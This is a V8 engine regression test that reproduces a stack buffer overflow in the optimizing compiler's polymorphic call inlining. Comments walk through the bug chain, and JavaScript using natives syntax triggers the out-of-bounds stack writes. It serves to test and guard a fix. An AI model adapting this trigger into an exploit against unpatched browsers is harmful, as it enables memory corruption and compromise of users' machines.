// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --allow-natives-syntax
//
// Stack buffer overflow in JSInliningHeuristic::TryReuseDispatch.
//
// Chain:
//   1. `B(t, r)` is JSCall(BoundFn, undef, t, r).  JSCallReducer unwraps the
//      bound function and chains two Function.prototype.call reductions in a
//      single Reduce(), leaving JSCall(target=Phi2{FPC,userFn},
//      receiver=PhiN{f0..f7}, ...).  JSInliningHeuristic snapshots Phi2 with
//      num_functions=2 (<= kMaxCallPolymorphism) and defers it.
//   2. bigFn (deferred, higher score) is inlined first in Finalize().  Its
//      body has only kNoThrow ops, so JSInliner gives the surrounding catch
//      handler a Dead control input.  DeadCodeElimination then collapses the
//      try/catch merge, folding Phi2 to the FPC constant.
//   3. The vulnerable JSCall is revisited; JSCallReducer fires the third
//      Function.prototype.call reduction (arity==0 path), shifting the
//      *receiver* (PhiN) into the target slot.  seen_ blocks re-snapshot.
//   4. Finalize() pops the stale candidate.  InlineCandidate reads the live
//      callee = PhiN and TryReuseDispatch sets *num_calls = N with no upper
//      bound, then writes calls[i]/if_successes[i] for i in [0,N) into stack
//      arrays sized [kMaxCallPolymorphism+1]=5 and [kMaxCallPolymorphism]=4.

// `var` (not `const`) so no ThrowReferenceErrorIfHole branches are emitted at
// the use sites -- those would (a) keep the catch arm alive and (b) shift the
// call's control input off the switch merge.
var FPC = Function.prototype.call;
// Bound trampoline: lets us emit JSCall(FPC, FPC, t, r) at the call site
// *without* a post-switch GetNamedProperty/CheckMaps, so TryReuseDispatch's
// effect-chain check (Checkpoint -> EffectPhi) holds.
var B = FPC.bind(FPC);

function f0(){} function f1(){} function f2(){} function f3(){}
function f4(){} function f5(){} function f6(){} function f7(){}

%NeverOptimizeFunction(f0); %NeverOptimizeFunction(f1);
%NeverOptimizeFunction(f2); %NeverOptimizeFunction(f3);
%NeverOptimizeFunction(f4); %NeverOptimizeFunction(f5);
%NeverOptimizeFunction(f6); %NeverOptimizeFunction(f7);

// Per-arm effect so an EffectPhi survives at the switch merge.
function sink(){}
%NeverOptimizeFunction(sink);

// userFn: inlineable, NOT small (>30 bytecode bytes), and larger than bigFn so
// the polymorphic candidate's score (= frequency / total_size) is *lower* than
// bigFn's -- bigFn is popped from candidates_ first.
function userFn(a) {
  var s = a|0;
  s=s|1; s=s|2; s=s|3; s=s|4; s=s|5; s=s|6; s=s|7; s=s|8; s=s|9; s=s|10;
  s=s|11; s=s|12; s=s|13; s=s|14; s=s|15; s=s|16; s=s|17; s=s|18; s=s|19;
  return s;
}

// bigFn: NOT small (>30 bytes) so it is deferred to candidates_, and its body
// contains only kNoThrow ops (constants/locals -- entry stack-check is skipped
// for inlinees) so that after inlining the surrounding catch arm goes Dead.
function bigFn() {
  var a=1,b=2,c=3,d=4,e=5,f=6,g=7,h=8,
      i=9,j=10,k=11,l=12,m=13,n=14,o=15,p=16;
  return 0;
}

function opt(x) {
  // Preload everything that would otherwise emit a JSLoadGlobal /
  // hole-check inside the try block or after the switch merge.
  var fpc = FPC;
  var b   = B;
  var big = bigFn;
  var t   = userFn;
  try {
    big();                            // only throwing op in the try block
    t = fpc;
  } catch (e) {}
  // Phi2 = Phi(FPC, userFn) at the try/catch merge.

  var r = f0;
  switch (x & 7) {                    // 8 cases + implicit fallthrough = 9-way
    case 0: r = f0; sink(); break;
    case 1: r = f1; sink(); break;
    case 2: r = f2; sink(); break;
    case 3: r = f3; sink(); break;
    case 4: r = f4; sink(); break;
    case 5: r = f5; sink(); break;
    case 6: r = f6; sink(); break;
    case 7: r = f7; sink(); break;
  }
  // PhiN = Phi(f0, f0, f1, ..., f7) and EffectPhi at the switch merge.

  b(t, r);                            // the vulnerable site (no post-merge
                                      // property load / CheckMaps)
}

%PrepareFunctionForOptimization(bigFn);
%PrepareFunctionForOptimization(userFn);
%PrepareFunctionForOptimization(opt);
for (var i = 0; i < 16; i++) opt(i);  // hit every switch arm
%OptimizeFunctionOnNextCall(opt);
opt(0);
